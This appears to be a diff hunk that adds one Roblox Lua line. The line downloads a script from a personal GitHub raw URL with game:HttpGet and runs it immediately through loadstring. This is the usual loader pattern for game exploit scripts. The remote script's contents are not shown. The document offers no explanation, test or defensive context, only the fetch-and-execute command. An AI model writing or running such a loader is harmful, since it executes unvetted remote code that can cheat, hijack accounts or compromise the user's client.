@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/carlossano888-create/jesus/refs/heads/main/onix.lua"))()
